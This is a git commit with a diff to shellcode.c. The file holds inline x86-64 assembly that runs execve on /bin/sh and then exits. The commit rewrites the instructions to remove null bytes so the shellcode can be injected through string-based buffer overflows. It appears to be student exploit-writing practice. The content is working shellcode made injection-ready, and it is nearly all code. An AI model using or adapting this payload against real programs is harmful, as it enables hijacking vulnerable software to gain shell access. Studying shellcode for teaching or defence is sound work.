56e64e9a7830f0125c66b43dcef41392a55aa4da
Nalam V S S Krishna Chaitanya <cs13b021@smail.iitm.ac.in>
2015-12-16 09:45:51 +0530

    null bytes are removed and shellcode is tested.

--- shellcode.c
+++ shellcode.c
@@ -3,20 +3,22 @@
 void main()
 {
 __asm__ (
-		"jmp .+0x35;"
+		"jmp .+0x29;"
 		"pop %rbx;"
 		"mov %rbx, 0x8(%rbx);"
-		"movb $0x0, 0x7(%rbx);"
-		"movq $0x0, 0x10(%rbx);"
-		"mov $0x3b, %eax;"
-		"mov $0x0, %edx;"
+		"xorq %rax, %rax;"
+		"movb %ah, 0x7(%rbx);"
+		"movq %rax, 0x10(%rbx);"
+		"mov %eax, %edx;"
+		"movb $0x3b, %al;"
 		"mov 0x8(%rbx), %rdi;"
 		"lea 0x8(%rbx), %rsi;"
 		"syscall;"
-		"mov $0x0, %rdi;"
-		"mov $0x3c, %eax;"
+		"xorq %rcx, %rcx;"
+		"mov %rcx, %rdi;"
+		"movb $0x3c, %al;"
 		"syscall;"
-		"call .-0x33;"
+		"call .-0x27;"
 		".string \"/bin/sh                 \";"
 );
 }
